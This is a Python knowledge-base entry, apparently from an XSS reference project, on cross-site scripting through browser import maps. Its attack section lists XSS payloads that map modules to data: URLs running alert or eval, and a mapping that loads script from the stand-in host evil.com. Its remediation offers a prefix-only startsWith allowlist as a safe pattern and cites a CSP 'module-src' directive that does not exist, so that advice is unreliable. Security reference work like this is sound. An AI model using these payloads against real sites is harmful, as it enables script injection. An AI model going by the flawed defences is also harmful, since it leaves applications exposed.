#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Knowledge Base: Import Maps XSS
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) via Import Maps",
    "severity": "high",
    "cvss_score": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
    "reliability": "high",
    "cwe": ["CWE-79", "CWE-829"],
    "owasp": ["A03:2021", "A06:2021"],
    "tags": ["xss", "import-maps", "es-modules", "module-resolution", "chrome-89"],
    "description": """
Import Maps (Chrome 89+) allow controlling module resolution. XSS vulnerabilities occur
when user input is reflected in import map definitions, allowing arbitrary module loading
or code execution via data: URLs.

SEVERITY: HIGH
Can lead to arbitrary JavaScript execution through module imports. Bypasses CSP in some cases.
""",
    "attack_vector": """
IMPORT MAP INJECTION:
<script type="importmap">
{
  "imports": {
    "x": "data:text/javascript,alert(1)"
  }
}
</script>
<script type="module">import "x"</script>

IMPORT MAP WITH USER INPUT:
<script type="importmap">
{
  "imports": {
    "app": "${userInput}"  // XSS if userInput is data: URL
  }
}
</script>

IMPORT MAP SCOPE INJECTION:
<script type="importmap">
{
  "imports": {
    "x": "//evil.com/x.js"
  },
  "scopes": {
    "/": {
      "x": "${userInput}"  // XSS
    }
  }
}
</script>

IMPORT MAP DYNAMIC CREATION:
const map = document.createElement('script');
map.type = 'importmap';
map.textContent = JSON.stringify({
  imports: { x: userInput }  // XSS if userInput is data: URL
});
document.head.appendChild(map);

IMPORT MAP WITH EVAL:
<script type="importmap">
{
  "imports": {
    "x": "data:text/javascript,eval('alert(1)')"
  }
}
</script>
""",
    "remediation": """
DEFENSE:

1. Validate all import map URLs (whitelist allowed origins)
2. Block data: and javascript: URLs in import maps
3. Sanitize JSON before parsing import maps
4. Implement strict CSP with trusted-types
5. Use Content Security Policy module-src directive

SAFE PATTERN:
const allowedOrigins = ['https://cdn.example.com'];
function validateImportMap(map) {
  for (const [key, value] of Object.entries(map.imports)) {
    if (!allowedOrigins.some(origin => value.startsWith(origin))) {
      throw new Error('Invalid import URL');
    }
  }
}

CSP HEADER:
Content-Security-Policy: script-src 'self'; module-src 'self' https://cdn.example.com;

OWASP REFERENCES:
- CWE-79: Cross-site Scripting
- CWE-829: Inclusion of Functionality from Untrusted Control Sphere
- Import Maps Specification
""",
}
